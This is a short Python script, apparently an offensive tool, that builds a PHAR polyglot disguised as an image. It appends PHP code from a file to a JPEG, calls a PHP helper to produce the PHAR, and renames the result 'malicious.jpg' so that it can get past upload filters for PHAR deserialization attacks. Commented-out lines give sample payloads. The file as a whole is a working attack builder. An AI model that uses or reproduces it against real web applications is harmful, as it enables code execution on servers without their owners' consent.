import os
import base64
import sys
import subprocess

from pathlib import Path

# if len(sys.argv) < 2:
#     print('[!] No argument found')
#     print('[!] Usage : python3 phar_creator.py payload')
#     print('[!] Example : python3 phar_creator.py \'<?php phpinfo(); __HALT_COMPILER(); ?>\'')
#     exit(1)

# if not '__HALT_COMPILER()' in sys.argv[1]:
#     print('[!] Can\'t create payload without __HALT_COMPILER()')
#     exit(1)

with open('starbucks3.jpeg', 'rb') as f:
    picture_data = f.read()

# malicious_payload_data = sys.argv[1].encode()

 # malicious_payload_data = '<?php phpinfo();  __HALT_COMPILER(); ?>'.encode()

malicious_payload_data = Path('malicious_php_code.txt').read_text().encode()

phar_payload = base64.b64encode(picture_data + malicious_payload_data).decode()

bash_command = "php phar_generator.php " + phar_payload
process = subprocess.Popen(bash_command.split(), stdout=subprocess.PIPE)
output, error = process.communicate()
if output != b'[+] File created\n':
    print('[-] An error occured while creating the file')

os.rename('./payload.phar', './malicious.jpg')
